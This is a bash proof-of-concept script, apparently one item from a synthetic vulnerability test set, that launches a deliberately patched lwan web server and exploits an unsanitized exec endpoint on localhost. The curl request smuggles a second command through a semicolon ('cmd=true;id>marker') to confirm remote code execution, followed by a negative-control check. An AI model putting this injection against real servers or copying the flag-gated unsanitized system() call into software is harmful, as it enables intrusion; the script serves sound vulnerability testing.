#!/usr/bin/env bash
# PoC for 079_lwan_C3I1S3
# Axes: C3 (three flags + utility fn) / I1 (direct to system()) / S3 (flag-gated check)
#
# The vulnerability: --exec-audit enables a sanitization check; omitting it
# bypasses the check entirely (S3). Payload uses semicolon to chain commands.
#
# The patched binary (lwan) lives in this directory. If absent, run build.sh.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lwan"
WWWROOT="/tmp/poc_079_www"
MARKER="/tmp/poc_079_marker"
PORT=18079
NEG_PORT=19079

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && {
        kill "$SERVER_PID" 2>/dev/null || true
        # also kill worker threads that survive the main process
        pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    }
    # release port in case worker threads still hold it
    fuser -k 18079/tcp 2>/dev/null || true
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# start server ───────────────────────────────────────────────────────────────────
echo "[*] starting lwan with --exec-mode (no --exec-audit) on port $PORT..."
"$BINARY" -r "$WWWROOT" -l "*:$PORT" --exec-mode &
SERVER_PID=$!
sleep 1.0

# # trigger: with semicolon (S3 bypass) ─────────────────────────────────────────────────────
echo "[*] sending payload (with semicolon (S3 bypass)): cmd=true;id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=true;id>${MARKER}" > /dev/null || true

sleep 0.3

# verify ─────────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# negative control: endpoint absent without --exec-mode ──────────────────────────
echo "[*] verifying gate: endpoint must return 404 without --exec-mode..."
kill "$SERVER_PID" 2>/dev/null || true
pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
fuser -k 18079/tcp 2>/dev/null || true
wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
sleep 0.3

"$BINARY" -r "$WWWROOT" -l "*:$NEG_PORT" &
SAFE_PID=$!
sleep 1.0
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?id" || true)
kill "$SAFE_PID" 2>/dev/null || true
pkill -KILL -P "$SAFE_PID" 2>/dev/null || true
fuser -k 19079/tcp 2>/dev/null || true
wait "$SAFE_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
